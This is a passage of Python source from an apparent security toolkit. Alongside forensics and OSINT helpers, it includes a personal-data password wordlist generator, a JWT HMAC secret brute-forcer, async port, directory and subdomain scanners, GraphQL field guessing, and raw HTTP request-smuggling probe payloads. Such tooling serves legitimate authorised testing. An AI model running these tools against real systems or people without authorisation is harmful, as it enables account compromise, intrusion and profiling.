        hex_part = " ".join(f"{b:02x}" for b in row).ljust(16 * 3)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        line = f"{offset + i:08x}  {hex_part}  {ascii_part}"
        lines.append(line)
        log(line, "muted")
    return "\n".join(lines)


def file_hashes(path: str, log: Logger) -> dict[str, str]:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return {}
    hashers = {name: hashlib.new(name) for name in ("md5", "sha1", "sha256", "sha512")}
    with p.open("rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            for h in hashers.values():
                h.update(chunk)
    out = {name: h.hexdigest() for name, h in hashers.items()}
    log(f"[*] File: {p.name}  size: {p.stat().st_size:,} bytes", "cyan")
    for name, digest in out.items():
        log(f"  {name.upper():<7} {digest}", "info")
    return out


def read_exif(path: str, log: Logger) -> dict:
    try:
        from PIL import Image, ExifTags
    except ImportError:
        log("[-] Pillow not installed. Run: pip install Pillow", "err")
        return {}
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return {}
    try:
        img = Image.open(p)
        raw = img._getexif() or {}
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    out: dict[str, str] = {}
    for tag_id, value in raw.items():
        name = ExifTags.TAGS.get(tag_id, str(tag_id))
        if isinstance(value, bytes): value = value[:200]
        out[name] = str(value)
        log(f"  {name:<22} {value}", "info")
    if not out:
        log("[!] No EXIF metadata", "warn")
    return out


def identify_magic(path: str, log: Logger) -> str | None:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return None
    header = p.read_bytes()[:32]
    for signature, name in MAGIC_SIGNATURES:
        if header.startswith(signature):
            log(f"[+] {name}", "ok")
            return name
    log("[!] Unknown file signature", "warn")
    log("  First 32 bytes: " + " ".join(f"{b:02x}" for b in header), "muted")
    return None


def compare_files(a: str, b: str, log: Logger) -> dict:
    pa, pb = Path(a), Path(b)
    if not pa.is_file() or not pb.is_file():
        log("[-] One or both files not found", "err")
        return {}
    da, db = pa.read_bytes(), pb.read_bytes()
    if da == db:
        log("[+] Files are identical", "ok")
        return {"identical": True, "size_a": len(da), "size_b": len(db)}
    off = None
    for i in range(min(len(da), len(db))):
        if da[i] != db[i]:
            off = i; break
    if off is None:
        off = min(len(da), len(db))
    log(f"[!] Differ at offset 0x{off:x}   sizes: {len(da):,} vs {len(db):,}", "warn")
    return {"identical": False, "offset": off, "size_a": len(da), "size_b": len(db)}


# ---------------------------------------------------------------------------
# OSINT
# ---------------------------------------------------------------------------
def verify_email(email: str, log: Logger) -> dict:
    m = EMAIL_REGEX.match(email.strip())
    if not m:
        log("[-] Invalid email syntax", "err")
        return {"valid": False}
    log("[+] Syntax valid", "ok")
    domain = m.group(1)
    out: dict = {"valid": True, "domain": domain, "mx": []}
    try:
        import dns.resolver  # type: ignore
        answers = dns.resolver.resolve(domain, "MX", lifetime=5)
        for rdata in answers:
            out["mx"].append(str(rdata))
            log(f"  MX  {rdata}", "info")
    except ImportError:
        log("[!] dnspython not installed", "warn")
    except Exception:
        log("[!] No MX records found", "warn")
    return out


def ip_geolocate(target: str, log: Logger) -> dict:
    import requests
    try:
        resp = requests.get(f"http://ip-api.com/json/{target}", timeout=8)
        data = resp.json()
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    if data.get("status") != "success":
        log(f"[-] {data.get('message', 'lookup failed')}", "err")
        return {}
    for key in ("query", "country", "regionName", "city", "zip", "lat",
                "lon", "timezone", "isp", "org", "as"):
        if data.get(key):
            log(f"  {key:<12} {data[key]}", "info")
    return data


def username_search(username: str, log: Logger) -> list[tuple[str, str, int]]:
    import requests
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (PENETRATOR/1.0)",
        "Accept-Language": "en-US,en;q=0.9",
    })

    def probe(site: str, tmpl: str) -> tuple[str, str, int]:
        url = tmpl.format(u=username)
        try:
            r = sess.get(url, timeout=8, allow_redirects=True)
            return site, url, r.status_code
        except requests.RequestException:
            return site, url, 0

    log(f"[*] Checking {username} on {len(USERNAME_SITES)} sites", "cyan")
    rows: list[tuple[str, str, int]] = []
    with ThreadPoolExecutor(max_workers=10) as pool:
        for fut in as_completed(pool.submit(probe, site, tmpl) for site, tmpl in USERNAME_SITES.items()):
            site, url, code = fut.result()
            rows.append((site, url, code))
            tag = "ok" if code == 200 else ("muted" if code == 404 else "warn" if code else "err")
            log(f"  [{code or '---'}] {site:<15} {url}", tag)
    return rows


def phone_info(number: str, log: Logger) -> dict:
    try:
        import phonenumbers
        from phonenumbers import carrier, geocoder, timezone
    except ImportError:
        log("[-] phonenumbers not installed. Run: pip install phonenumbers", "err")
        return {}
    try:
        parsed = phonenumbers.parse(number, None)
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    out = {
        "valid": phonenumbers.is_valid_number(parsed),
        "possible": phonenumbers.is_possible_number(parsed),
        "country_code": parsed.country_code,
        "region": geocoder.description_for_number(parsed, "en"),
        "carrier": carrier.name_for_number(parsed, "en"),
        "timezones": list(timezone.time_zones_for_number(parsed)),
        "e164": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
    }
    for k, v in out.items():
        log(f"  {k:<14} {v}", "info")
    return out


def reverse_dns(ip: str, log: Logger) -> tuple[str, list[str], list[str]] | None:
    try:
        name, aliases, addrs = socket.gethostbyaddr(ip)
    except socket.herror as exc:
        log(f"[-] {exc}", "err")
        return None
    log(f"[+] Hostname: {name}", "ok")
    if aliases:
        log(f"  Aliases:  {', '.join(aliases)}", "info")
    log(f"  Addresses:  {', '.join(addrs)}", "info")
    return name, aliases, addrs


# ---------------------------------------------------------------------------
# Wordlist generation
# ---------------------------------------------------------------------------
def cupp_wordlist(values: dict[str, str]) -> set[str]:
    base = {v.strip() for v in values.values() if v.strip() and v.strip() != values.get("birthday", "")}
    birthday = values.get("birthday", "").strip()
    base |= {v.strip() for v in (values.get("keywords", "").split(",")) if v.strip()}
    cased: set[str] = set()
    for w in base:
        cased |= {w, w.lower(), w.upper(), w.capitalize()}
    combined = set(cased)
    for a, b in itertools.permutations(cased, 2):
        combined.add(a + b)
    suffixes = ["", "1", "12", "123", "1234", "!", "!!", "!@#"] + [str(y) for y in range(1960, 2031)]
    if birthday and len(birthday) >= 4:
        suffixes += [birthday, birthday[-4:], birthday[-2:]]
    final = set(combined)
    for w in combined:
        for s in suffixes:
            final.add(w + s)
    return final


def combinator(left: list[str], right: list[str]) -> set[str]:
    return {a + b for a in left for b in right}


def leet_mutate(words: list[str], per_word: int = 30) -> set[str]:
    out: set[str] = set()
    for word in words:
        positions = [LEET_MAP.get(ch.lower(), [ch]) for ch in word]
        for i, combo in enumerate(itertools.product(*positions)):
            if i >= per_word:
                break
            out.add("".join(combo))
    return out


def pattern_generate(charset: str, min_len: int, max_len: int) -> Iterable[str]:
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield "".join(combo)


# ---------------------------------------------------------------------------
# crt.sh — Certificate Transparency subdomain enumeration
# ---------------------------------------------------------------------------
def crtsh_subdomains(domain: str, log: Logger) -> list[str]:
    """Query Certificate Transparency logs via crt.sh for SAN entries."""
    import requests
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    log(f"[*] Querying crt.sh for *.{domain}", "cyan")
    try:
        resp = requests.get(url, timeout=30,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return []
    if resp.status_code != 200:
        log(f"[-] crt.sh returned HTTP {resp.status_code}", "err")
        return []
    try:
        records = resp.json()
    except ValueError:
        log("[-] crt.sh returned non-JSON (rate limited?)", "err")
        return []
    found: set[str] = set()
    for rec in records:
        for name in (rec.get("name_value") or "").splitlines():
            name = name.strip().lower().lstrip("*.")
            if name and name.endswith(domain) and " " not in name:
                found.add(name)
    sorted_names = sorted(found)
    for name in sorted_names:
        log(f"  + {name}", "ok")
    log(f"[*] {len(sorted_names)} unique subdomain(s) from CT logs", "cyan")
    return sorted_names


# ---------------------------------------------------------------------------
# Banner grabbing
# ---------------------------------------------------------------------------
def grab_banner(host: str, port: int, timeout: float, log: Logger) -> str:
    """Connect to host:port, send a probe, and return the first response chunk."""
    import socket as _s
    probes = {
        80: b"HEAD / HTTP/1.0\r\n\r\n",
        8080: b"HEAD / HTTP/1.0\r\n\r\n",
        443: b"",  # TLS — handled separately below
        21: b"", 22: b"", 25: b"HELP\r\n", 110: b"QUIT\r\n",
        143: b"a001 LOGOUT\r\n", 3306: b"\x00",
    }
    try:
        with _s.socket(_s.AF_INET, _s.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            probe = probes.get(port, b"")
            if probe:
                sock.sendall(probe)
            data = sock.recv(2048)
    except OSError as exc:
        log(f"  [{port}] {exc}", "muted")
        return ""
    text = data.decode("utf-8", errors="replace").strip()
    if text:
        first_lines = "\n".join(text.splitlines()[:3])
        log(f"[+] {host}:{port}", "ok")
        for line in first_lines.splitlines():
            log(f"    {line}", "info")
    else:
        log(f"  [{port}] no banner", "muted")
    return text


def scan_with_banners(target: str, start: int, end: int, threads: int,
                      timeout: float, log: Logger) -> dict[int, str]:
    """Port scan + banner grab on each open port."""
    open_ports = scan_ports(target, start, end, threads, timeout, log)
    if not open_ports:
        return {}
    log("[*] Grabbing banners...", "cyan")
    banners: dict[int, str] = {}
    for p in open_ports:
        banners[p] = grab_banner(target, p, timeout * 2, log)
    return banners


# ---------------------------------------------------------------------------
# TLS / SSL scanner
# ---------------------------------------------------------------------------
def tls_scan_last_open_tls(log: Logger) -> list[dict]:
    """Cross-tool chain: pick TLS-likely ports from the last port scan and run
    tls_scan() on each."""
    target = session_get("last_target")
    open_ports = session_get("last_open_ports") or []
    if not target or not open_ports:
        log("[-] No previous port scan in this session. Run a scan first.",
            "err")
        return []
    tls_ports = [p for p in open_ports if p in (443, 465, 587, 636, 993, 995,
                                                8443, 9443, 4443)]
    if not tls_ports:
        log(f"[!] No TLS-likely ports among {open_ports}.", "warn")
        return []
    log(f"[*] Chain: TLS scan on {target} ports {tls_ports}", "cyan")
    out: list[dict] = []
    for p in tls_ports:
        if _should_stop():
            break
        result = tls_scan(target, p, log)
        out.append(result)
    return out


def tls_scan(host: str, port: int, log: Logger) -> dict:
    """Inspect cert chain, expiry, supported TLS versions and weak protocols."""
    import socket as _s
    import ssl
    from datetime import datetime, timezone

    out: dict = {"host": host, "port": port}
    log(f"[*] TLS scan {host}:{port}", "cyan")

    # 1. Cert info via default context
    try:
        ctx = ssl.create_default_context()
        with _s.create_connection((host, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                version = ssock.version()
    except Exception as exc:
        log(f"[-] TLS handshake failed: {exc}", "err")
        return out

    out["tls_version"] = version
    out["cipher"] = cipher
    log(f"[+] Negotiated: {version}  cipher={cipher[0] if cipher else '?'}", "ok")

    # 2. Subject / Issuer / SANs
    subject = dict(x[0] for x in cert.get("subject", []))
    issuer = dict(x[0] for x in cert.get("issuer", []))
    sans = [v for k, v in cert.get("subjectAltName", []) if k == "DNS"]
    out["subject_cn"] = subject.get("commonName")
    out["issuer_cn"] = issuer.get("commonName")
    out["sans"] = sans
    log(f"  Subject CN  {out['subject_cn']}", "info")
    log(f"  Issuer  CN  {out['issuer_cn']}", "info")
    if sans:
        log(f"  SANs        {', '.join(sans[:8])}"
            + (f" (+{len(sans) - 8} more)" if len(sans) > 8 else ""), "info")

    # 3. Validity window
    try:
        not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
        not_after = not_after.replace(tzinfo=timezone.utc)
        days_left = (not_after - datetime.now(timezone.utc)).days
        out["expires"] = cert["notAfter"]
        out["days_left"] = days_left
        tag = "ok" if days_left > 30 else "warn" if days_left > 0 else "err"
        log(f"  Expires     {cert['notAfter']}  ({days_left} days)", tag)
    except (KeyError, ValueError):
        pass

    # 4. Probe legacy protocols (TLS 1.0 / 1.1 / SSLv3)
    legacy_versions = [
        ("SSLv3",    getattr(ssl, "PROTOCOL_SSLv23", None), getattr(ssl.TLSVersion, "SSLv3", None)),
        ("TLSv1.0",  None, ssl.TLSVersion.TLSv1),
        ("TLSv1.1",  None, ssl.TLSVersion.TLSv1_1),
    ]
    legacy_supported: list[str] = []
    for name, _, tlsver in legacy_versions:
        if tlsver is None:
            continue
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx2.check_hostname = False
            ctx2.verify_mode = ssl.CERT_NONE
            ctx2.minimum_version = tlsver
            ctx2.maximum_version = tlsver
            with _s.create_connection((host, port), timeout=4) as s2:
                with ctx2.wrap_socket(s2, server_hostname=host):
                    legacy_supported.append(name)
        except Exception:
            pass
    out["legacy_supported"] = legacy_supported
    if legacy_supported:
        log(f"[!] Legacy protocols supported: {', '.join(legacy_supported)}", "warn")
    else:
        log("[+] No legacy protocols (SSLv3/TLS1.0/TLS1.1) accepted", "ok")
    return out


# ---------------------------------------------------------------------------
# JWT toolkit
# ---------------------------------------------------------------------------
def _b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def jwt_decode(token: str, log: Logger) -> dict:
    """Decode and pretty-print a JWT. Does NOT verify signature."""
    import json as _json
    parts = token.strip().split(".")
    if len(parts) != 3:
        log("[-] Not a JWT (need 3 dot-separated parts)", "err")
        return {}
    try:
        header = _json.loads(_b64url_decode(parts[0]))
        payload = _json.loads(_b64url_decode(parts[1]))
    except Exception as exc:
        log(f"[-] Decode failed: {exc}", "err")
        return {}
    out = {"header": header, "payload": payload, "signature_b64": parts[2]}

    log("[+] Header:", "ok")
    for k, v in header.items():
        log(f"    {k}: {v}", "info")
    log("[+] Payload:", "ok")
    for k, v in payload.items():
        log(f"    {k}: {v}", "info")
    log(f"[+] Signature (b64): {parts[2][:50]}{'...' if len(parts[2]) > 50 else ''}", "ok")

    alg = header.get("alg", "").lower()
    if alg == "none":
        log("[!] alg='none' — token can be forged trivially", "warn")
    if alg.startswith("hs"):
        log(f"[i] HMAC algorithm ({alg.upper()}). Try jwt_brute() with a wordlist.",
            "muted")
    return out


def jwt_brute(token: str, wordlist_path: str, log: Logger) -> str | None:
    """Brute-force the HS256/384/512 secret from a wordlist."""
    import hmac as _hmac
    import json as _json
    parts = token.strip().split(".")
    if len(parts) != 3:
        log("[-] Not a JWT", "err"); return None
    try:
        header = _json.loads(_b64url_decode(parts[0]))
    except Exception as exc:
        log(f"[-] Decode failed: {exc}", "err"); return None
    alg = (header.get("alg") or "").upper()
    digest = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}.get(alg)
    if digest is None:
        log(f"[-] Unsupported alg: {alg!r} (need HS256/384/512)", "err")
        return None

    signing_input = (parts[0] + "." + parts[1]).encode()
    expected = _b64url_decode(parts[2])

    path = Path(wordlist_path)
    if not path.is_file():
        log(f"[-] Wordlist not found: {wordlist_path}", "err"); return None

    log(f"[*] Brute-forcing {alg} signature with {path}", "cyan")
    tried = 0; t0 = time.time()
    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            if _should_stop():
                log("[!] Stop requested - aborting", "warn")
                return None
            secret = line.rstrip("\r\n")
            if not secret:
                continue
            tried += 1
            mac = _hmac.new(secret.encode(), signing_input, digest).digest()
            if _hmac.compare_digest(mac, expected):
                log(f"[+] Secret found after {tried} attempts: {secret!r}", "ok")
                return secret
            if tried % 20000 == 0:
                log(f"    ... tried {tried:,}", "muted")
    log(f"[-] Not found ({tried:,} tried in {time.time() - t0:.2f}s)", "warn")
    return None


# ---------------------------------------------------------------------------
# HIBP — Pwned Password check (k-anonymity API, no key required)
# ---------------------------------------------------------------------------
def hibp_password_check(password: str, log: Logger) -> int:
    """Returns occurrence count in HIBP corpus (0 = not pwned)."""
    import requests
    sha1 = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    log(f"[*] Querying HIBP range API for SHA-1 prefix {prefix}", "cyan")
    try:
        resp = requests.get(
            f"https://api.pwnedpasswords.com/range/{prefix}",
            headers={"User-Agent": "PENETRATOR/1.0",
                     "Add-Padding": "true"},
            timeout=10,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return -1
    if resp.status_code != 200:
        log(f"[-] HIBP HTTP {resp.status_code}", "err"); return -1
    for line in resp.text.splitlines():
        if ":" not in line:
            continue
        suf, count = line.split(":", 1)
        if suf.strip().upper() == suffix:
            n = int(count.strip())
            log(f"[!] PWNED — seen {n:,} times in known breaches", "err")
            return n
    log("[+] Not found in HIBP — but absence is not a guarantee", "ok")
    return 0


# ---------------------------------------------------------------------------
# Subdomain takeover detector
# ---------------------------------------------------------------------------
TAKEOVER_FINGERPRINTS: list[tuple[str, str, str]] = [
    # service, cname-suffix, body-fingerprint
    ("AWS S3",          "s3.amazonaws.com",          "NoSuchBucket"),
    ("AWS S3",          "s3-website",                "NoSuchBucket"),
    ("GitHub Pages",    "github.io",                 "There isn't a GitHub Pages site here"),
    ("Heroku",          "herokudns.com",             "No such app"),
    ("Heroku",          "herokuapp.com",             "No such app"),
    ("Azure",           "azurewebsites.net",         "404 Web Site not found"),
    ("Azure",           "cloudapp.net",              "404 Web Site not found"),
    ("Azure CDN",       "azureedge.net",             "Web Site not found"),
    ("Fastly",          "fastly.net",                "Fastly error: unknown domain"),
    ("Shopify",         "myshopify.com",             "Sorry, this shop is currently unavailable"),
    ("Tumblr",          "domains.tumblr.com",        "Whatever you were looking for doesn't currently exist"),
    ("Bitbucket",       "bitbucket.io",              "Repository not found"),
    ("Cargo",           "cargocollective.com",       "404 Not Found"),
    ("Pantheon",        "pantheonsite.io",           "The gods are wise"),
    ("Surge",           "surge.sh",                  "project not found"),
    ("Read the Docs",   "readthedocs.io",            "unknown to Read the Docs"),
    ("Unbounce",        "unbouncepages.com",         "The requested URL was not found"),
    ("Zendesk",         "zendesk.com",               "Help Center Closed"),
]


def check_subdomain_takeover(host: str, log: Logger) -> dict:
    """For a given host, resolve CNAME and HTTP body, look for takeover fingerprint."""
    import requests
    out: dict = {"host": host, "cname": None, "vulnerable": False, "service": None}
    try:
        import dns.resolver
        try:
            answers = dns.resolver.resolve(host, "CNAME", lifetime=5)
            cname = str(answers[0]).rstrip(".")
            out["cname"] = cname
            log(f"  CNAME -> {cname}", "info")
        except Exception:
            log("  no CNAME", "muted")
    except ImportError:
        log("[-] dnspython not installed", "err"); return out

    try:
        resp = requests.get(f"http://{host}", timeout=8, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
        body = resp.text
    except requests.RequestException as exc:
        log(f"  HTTP error: {exc}", "muted")
        body = ""

    cname = (out.get("cname") or "").lower()
    for service, suffix, fingerprint in TAKEOVER_FINGERPRINTS:
        if suffix in cname and fingerprint.lower() in body.lower():
            out["vulnerable"] = True
            out["service"] = service
            log(f"[!] LIKELY TAKEOVER on {host} ({service})", "err")
            return out
    if not out["vulnerable"]:
        log(f"[+] {host} — no takeover fingerprint matched", "ok")
    return out


# ---------------------------------------------------------------------------
# HTTP Repeater — send a raw HTTP request, return the response
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Async port scanner — asyncio replaces the thread pool for ~5x speed
# ---------------------------------------------------------------------------
def scan_ports_async(target: str, start: int, end: int, concurrency: int,
                     timeout: float, log: Logger) -> list[int]:
    """Asyncio-based TCP scan. Massive speedup vs scan_ports() on big ranges."""
    import asyncio
    import socket as _socket

    try:
        ip = _socket.gethostbyname(target)
    except _socket.gaierror as exc:
        log(f"[-] Cannot resolve {target}: {exc}", "err")
        return []

    log(f"[*] Async scan {target} ({ip})  ports {start}-{end}  "
        f"concurrency={concurrency}", "cyan")

    open_ports: list[int] = []
    sem = None  # set inside the coroutine

    async def probe(port: int) -> None:
        async with sem:
            if _should_stop():
                return
            try:
                fut = asyncio.open_connection(ip, port)
                reader, writer = await asyncio.wait_for(fut, timeout=timeout)
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                open_ports.append(port)
                log(f"[+] {port:>5}/tcp   {get_service(port)}", "ok")
            except (asyncio.TimeoutError, OSError, ConnectionError):
                pass
            except Exception:
                pass

    async def runner() -> None:
        nonlocal sem
        sem = asyncio.Semaphore(concurrency)
        await asyncio.gather(*(probe(p) for p in range(start, end + 1)),
                             return_exceptions=True)

    t0 = time.time()
    try:
        asyncio.run(runner())
    except RuntimeError:
        # Already inside an event loop (rare in our threaded use)
        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(runner())
        finally:
            loop.close()
    log(f"[*] Found {len(open_ports)} open port(s) in {time.time() - t0:.2f}s "
        "(async)", "cyan")
    sorted_ports = sorted(open_ports)
    session_set("last_target", target)
    session_set("last_open_ports", sorted_ports)
    return sorted_ports


# ---------------------------------------------------------------------------
# Async directory buster
# ---------------------------------------------------------------------------
def buster_async(url: str, paths: list[str], concurrency: int,
                 log: Logger) -> list[tuple[int, str]]:
    """Asyncio-based directory buster — far faster on big wordlists."""
    import asyncio
    try:
        import aiohttp  # type: ignore
    except ImportError:
        log("[!] aiohttp not installed — falling back to threaded buster", "warn")
        return buster(url, paths, max(concurrency // 5, 10), log)

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"

    found: list[tuple[int, str]] = []
    log(f"[*] Async-busting {url} with {len(paths)} paths "
        f"concurrency={concurrency}", "cyan")

    async def runner() -> None:
        sem = asyncio.Semaphore(concurrency)
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(
            timeout=timeout,
            headers={"User-Agent": "PENETRATOR/1.0"},
        ) as session:
            async def probe(path: str) -> None:
                async with sem:
                    if _should_stop():
                        return
                    target = url + path.lstrip("/")
                    try:
                        async with session.head(target,
                                                allow_redirects=False) as r:
                            status = r.status
                        if status == 405:
                            async with session.get(target,
                                                   allow_redirects=False) as r:
                                status = r.status
                    except Exception:
                        return
                    if status in (200, 201, 202, 204, 301, 302, 307, 401, 403):
                        found.append((status, target))
                        log(f"[+] {status}  {target}", "ok")

            await asyncio.gather(*(probe(p) for p in paths),
                                 return_exceptions=True)

    t0 = time.time()
    try:
        asyncio.run(runner())
    except RuntimeError:
        loop = asyncio.new_event_loop()
        try: loop.run_until_complete(runner())
        finally: loop.close()
    log(f"[*] Discovered {len(found)} endpoint(s) in {time.time()-t0:.2f}s "
        "(async)", "cyan")
    return sorted(found)


# ---------------------------------------------------------------------------
# Async subdomain finder
# ---------------------------------------------------------------------------
def find_subdomains_async(domain: str, concurrency: int,
                          log: Logger) -> list[tuple[str, str]]:
    """Asyncio DNS resolution of common subdomains."""
    import asyncio
    import socket as _socket

    found: list[tuple[str, str]] = []
    log(f"[*] Async subdomain enum for {domain} ({len(COMMON_SUBDOMAINS)} probes)",
        "cyan")

    loop = None  # set in runner

    async def probe(sub: str) -> None:
        if _should_stop():
            return
        host = f"{sub}.{domain}"
        try:
            ip = await loop.getaddrinfo(host, None,
                                        family=_socket.AF_INET,
                                        type=_socket.SOCK_STREAM)
            ip_str = ip[0][4][0]
            found.append((sub, ip_str))
            log(f"[+] {host} -> {ip_str}", "ok")
        except (_socket.gaierror, OSError):
            pass

    async def runner() -> None:
        nonlocal loop
        loop = asyncio.get_running_loop()
        sem = asyncio.Semaphore(concurrency)

        async def bounded(sub):
            async with sem:
                await probe(sub)

        await asyncio.gather(*(bounded(s) for s in COMMON_SUBDOMAINS),
                             return_exceptions=True)

    t0 = time.time()
    try:
        asyncio.run(runner())
    except RuntimeError:
        l = asyncio.new_event_loop()
        try: l.run_until_complete(runner())
        finally: l.close()
    log(f"[*] {len(found)} subdomain(s) in {time.time()-t0:.2f}s (async)",
        "cyan")
    return sorted(found)


# ---------------------------------------------------------------------------
# Wayback Machine — list snapshots of a domain
# ---------------------------------------------------------------------------
def wayback_urls(domain: str, limit: int, log: Logger) -> list[str]:
    """Query the Internet Archive CDX API for historical URLs of a domain."""
    import requests
    log(f"[*] Querying Wayback CDX for {domain}", "cyan")
    api = (f"http://web.archive.org/cdx/search/cdx?url={domain}/*"
           f"&output=json&fl=original&collapse=urlkey&limit={limit}")
    try:
        resp = requests.get(api, timeout=30,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return []
    if resp.status_code != 200:
        log(f"[-] Wayback returned HTTP {resp.status_code}", "err")
        return []
    try:
        data = resp.json()
    except ValueError:
        log("[-] Non-JSON response", "err"); return []
    # First row is the column header
    urls = [row[0] for row in data[1:]] if data else []
    interesting = [u for u in urls
                   if any(s in u.lower()
                          for s in (".env", ".bak", ".git", "config", "admin",
                                    "backup", "secret", "key", "/api/", ".sql",
                                    ".log", "dump"))]
    for u in urls[:30]:
        log(f"  {u}", "info")
    if len(urls) > 30:
        log(f"  ... +{len(urls) - 30} more", "muted")
    if interesting:
        log(f"[+] {len(interesting)} potentially interesting URL(s):", "ok")
        for u in interesting[:25]:
            log(f"    ★ {u}", "accent")
    log(f"[*] Total: {len(urls)} unique URLs", "cyan")
    return urls


# ---------------------------------------------------------------------------
# GraphQL field enumeration (when introspection is disabled)
# ---------------------------------------------------------------------------
GRAPHQL_FIELD_GUESSES = [
    "user", "users", "me", "viewer", "currentUser", "profile", "profiles",
    "account", "accounts", "node", "nodes", "search", "find", "get", "list",
    "all", "admin", "adminUsers", "session", "sessions", "token", "auth",
    "login", "register", "products", "items", "orders", "transactions",
    "posts", "articles", "comments", "messages", "files", "uploads",
    "settings", "config", "configuration", "internal", "debug", "test",
    "secrets", "keys", "credentials", "permissions", "roles", "groups",
]


def graphql_field_enum(url: str, log: Logger) -> dict:
    """When introspection is OFF, brute-force common field names against
    the queryType and report which ones the server *recognizes*."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] GraphQL field enum on {url} "
        f"({len(GRAPHQL_FIELD_GUESSES)} guesses)", "cyan")

    found: list[str] = []
    sess = requests.Session()
    sess.headers.update({"Content-Type": "application/json",
                         "User-Agent": "PENETRATOR/1.0"})

    for field in GRAPHQL_FIELD_GUESSES:
        if _should_stop():
            break
        # Empty selection set -> server complains about a *specific* field if
        # the field doesn't exist, but with a parser/validator error for the
        # missing subselection if it *does* exist on a non-leaf type.
        query = {"query": "{ " + field + " }"}
        try:
            resp = sess.post(url, json=query, timeout=8)
        except requests.RequestException:
            continue
        try:
            data = resp.json()
        except ValueError:
            continue
        errors = data.get("errors") or []
        text = " ".join(str(e.get("message", "")).lower() for e in errors)
        # Heuristic: "must have a selection of subfields" / "Field ... is
        # missing" -> the field exists. "Cannot query field" -> it doesn't.
        if not errors and data.get("data") is not None:
            found.append(field)
            log(f"[+] {field}: returned data", "ok")
        elif "selection of subfields" in text or "must have a selection" in text:
            found.append(field)
            log(f"[+] {field}: exists (object type)", "ok")
        elif "field" in text and "not found" not in text and "unknown" not in text \
                and "cannot query" not in text:
            log(f"  {field}: ambiguous — {text[:80]}", "muted")

    log(f"[*] {len(found)} probable field(s)", "cyan")
    return {"found": found}


# ---------------------------------------------------------------------------
# HTTP request smuggling detector
# ---------------------------------------------------------------------------
def http_smuggling_detect(url: str, log: Logger) -> dict:
    """Probe for CL.TE / TE.CL desync via a malformed Transfer-Encoding."""
    import socket as _socket
    import ssl
    from urllib.parse import urlparse

    parsed = urlparse(url if url.startswith(("http://", "https://"))
                      else "http://" + url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"

    if not host:
        log("[-] Invalid URL", "err"); return {}

    log(f"[*] HTTP smuggling probe {host}:{port}{path}", "cyan")

    findings: dict = {"host": host, "port": port, "results": []}

    # CL.TE probe — frontend uses Content-Length, backend uses Transfer-Encoding
    cl_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    # TE.CL probe — frontend uses Transfer-Encoding, backend uses Content-Length
    te_cl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5e\r\n"
        "x" * 94 + "\r\n"
        "0\r\n"
        "\r\n"
    )
    # TE.TE — obfuscated TE headers
    te_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "\r\n"
        "5c\r\n"
        "x" * 92 + "\r\n"
        "0\r\n"
        "\r\n"
    )

    for name, payload in (("CL.TE", cl_te), ("TE.CL", te_cl),
                          ("TE.TE (dup TE header)", te_te)):
        if _should_stop():
            break
        try:
            sock = _socket.create_connection((host, port), timeout=10)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(payload.encode())
            sock.settimeout(8)
            data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 16384:
                        break
            except (TimeoutError, _socket.timeout):
                pass
            sock.close()
        except OSError as exc:
            log(f"  {name}: connection error {exc}", "muted")
            findings["results"].append({"variant": name, "error": str(exc)})
            continue

        text = data.decode("utf-8", errors="replace")
        first_line = text.split("\r\n", 1)[0] if text else "(no response)"
